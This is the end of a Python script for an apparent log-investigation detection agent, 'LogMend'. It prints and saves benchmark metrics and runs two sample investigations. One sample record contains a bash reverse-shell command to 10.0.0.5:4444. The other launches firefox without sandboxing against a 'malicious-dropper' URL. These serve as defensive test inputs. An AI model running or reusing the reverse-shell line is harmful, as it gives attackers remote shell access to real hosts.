    print(f"  Precision : {precision * 100:.2f}%")
    print(f"  Recall    : {recall * 100:.2f}%")
    print(f"  F1-Score  : {f1 * 100:.2f}%")
    print("=" * 55)

    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"LogMend_Benchmark_{ts}.txt"
    with open(filename, "w", encoding="utf-8") as fh:
        fh.write(f"LogMend Evaluation — {datetime.datetime.now()}\n")
        fh.write(f"Total:{total}  TP:{tp} TN:{tn} FP:{fp} FN:{fn}\n")
        fh.write(f"Accuracy:{accuracy*100:.2f}%  Precision:{precision*100:.2f}%  "
                 f"Recall:{recall*100:.2f}%  F1:{f1*100:.2f}%\n")
    print(f"\n  Report → {filename}")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    agent = LogMendAgent()

    print("\n[Test] BETH record")
    agent.run_investigation(json.dumps({
        "processId": 5555, "hostName": "ubuntu-host",
        "processName": "bash", "parentProcessId": 111,
        "cmdLine": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        "userId": "1001", "sus": 1, "evil": 0,
    }))

    print("\n[Test] DARPA record")
    agent.run_investigation(json.dumps({
        "uuid": "df8a8c88-1234-4a2a-9b1b-8f8f8f8f8f8f",
        "type": "firefox",
        "cmdLine": "firefox --no-sandbox http://malicious-dropper.com",
        "ppid": 1, "userId": "1000", "timestamp": 1620000000,
    }))

    # run_benchmark()   # uncomment for Neo4j-based training-split benchmark